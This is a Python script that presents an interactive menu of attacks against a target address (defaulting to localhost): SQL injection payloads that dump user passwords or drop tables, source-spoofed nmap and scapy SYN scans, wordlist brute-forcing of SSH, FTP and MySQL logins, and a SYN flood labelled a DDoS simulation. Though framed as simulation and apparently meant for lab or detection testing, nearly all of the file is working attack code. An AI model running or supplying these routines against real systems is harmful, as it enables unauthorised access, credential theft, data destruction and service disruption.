import paramiko
import ftplib
import requests
import mysql.connector
from mysql.connector import errors
from scapy.all import send, ARP, IP, TCP
from time import sleep
import subprocess

def simulate_sql_injection(target_url, vulnerable_param="id"):
    sql_payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL, version() -- ",
        "' UNION SELECT username, password FROM users -- ",
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
    ]

    print(f"Simulating SQL Injection on {target_url}")
    for payload in sql_payloads:
        params = {vulnerable_param: payload}
        try:
            response = requests.get(target_url, params=params)
            print(f"Payload: {payload}")
            print(f"Response Code: {response.status_code}")
            if response.text:
                print(f"Response Body Snippet: {response.text[:200]}...\n")
        except Exception as e:
            print(f"Error sending payload {payload}: {e}")

def scan_ports(ip_range, src_ip="192.168.1.10", interface="lo"):
    print(f"Scanning ports on {ip_range} from source IP {src_ip} using interface {interface}")
    try:
        command = [
            "nmap", 
            "-sS",
            "-S", src_ip,
            "-e", interface,
            "-p", "20-1024",
            ip_range
        ]
        scan_result = subprocess.run(command, capture_output=True, text=True)
        if scan_result.returncode == 0:
            print("Nmap scan result:")
            print(scan_result.stdout)
        else:
            print(f"Error during nmap scan: {scan_result.stderr}")
    except Exception as e:
        print(f"Error when scanning ports: {e}")

def syn_scan(target_ip, src_ip="192.168.1.10"):
    print(f"Performing SYN scan on {target_ip} from {src_ip}")
    try:
        for port in range(20, 40):
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=port, flags='S')
            send(packet, verbose=0)
            sleep(0.1)
        print("[+] SYN Scan completed")
    except Exception as e:
        print(f"Error during SYN scan: {e}")

def brute_force_ssh(target_ip, port=22):
    usernames = ['admin', 'root', 'user']
    passwords = ['123456', 'password', 'admin', 'admin123', 'azerty', 'Azerty123']
    for user in usernames:
        for passwd in passwords:
            sleep(1)
            try:
                print(f"Attempting SSH login with {user}:{passwd}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, port=port, username=user, password=passwd, timeout=2)
                print("[+] SSH Login Successful")
                client.close()
                return
            except paramiko.AuthenticationException:
                print("[-] SSH Login Failed")
            except Exception as e:
                print(f"Error: {e}")

def ftp_attack(target_ip, port=21):
    print(f"Attempting FTP login to {target_ip} on port {port}...")
    usernames = ['admin', 'root', 'user']
    passwords = ['123456', 'password', 'admin', 'admin123', 'azerty', 'Azerty123']
    for user in usernames:
        for passwd in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target_ip, port, timeout=10)
                ftp.login(user=user, passwd=passwd)
                print(f"[+] FTP Login Successful with {user}:{passwd}")
                ftp.quit()
                return
            except ftplib.error_perm:
                print(f"[-] Login Failed for {user}:{passwd}")
            except Exception as e:
                print(f"[-] FTP Attack Failed: {e}")

def mysql_brute_force(target_ip, port=3306):
    usernames = ['root', 'admin', 'test']
    passwords = ['password', '12345', 'admin']
    for user in usernames:
        for passwd in passwords:
            try:
                print(f"Attempting MySQL login with {user}:{passwd}")
                conn = mysql.connector.connect(
                    host=target_ip,
                    port=port,
                    user=user,
                    password=passwd
                )
                print("[+] MySQL Login Successful")
                conn.close()
                return
            except errors.ProgrammingError:
                print(f"[-] Login Failed for {user}:{passwd}")
            except Exception as e:
                print(f"Error: {e}")

def simulate_ddos(target_ip, src_ip="192.168.1.10"):
    print(f"Simulating DDoS attack on {target_ip} from {src_ip}")
    try:
        for _ in range(1000):
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=22, flags='S')
            send(packet, verbose=0)
        print("[+] DDoS simulation completed")
    except Exception as e:
        print(f"Error during DDoS simulation: {e}")

if __name__ == "__main__":
    target_ip = "127.0.0.1"

    while True:
        print("\nSelect an attack to perform:")
        print("1. Port Scan")
        print("2. SYN Scan")
        print("3. Brute Force SSH")
        print("4. FTP Attack")
        print("5. MySQL Brute Force")
        print("6. DDoS Simulation")
        print("7. SQL Injection")
        print("8. Quit")

        choice = input("Enter your choice: ")
        if choice == "1":
            src_ip = input("Enter source IP (default is 192.168.1.10): ") or "192.168.1.10"
            scan_ports(target_ip, src_ip)
        elif choice == "2":
            src_ip = input("Enter source IP (default is 192.168.1.10): ") or "192.168.1.10"
            syn_scan(target_ip, src_ip)
        elif choice == "3":
            brute_force_ssh(target_ip)
        elif choice == "4":
            ftp_attack(target_ip)
        elif choice == "5":
            mysql_brute_force(target_ip)
        elif choice == "6":
            src_ip = input("Enter source IP (default is 192.168.1.10): ") or "192.168.1.10"
            simulate_ddos(target_ip, src_ip)
        elif choice == "7":
            simulate_sql_injection("http://127.0.0.1/")
        elif choice == "8":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")
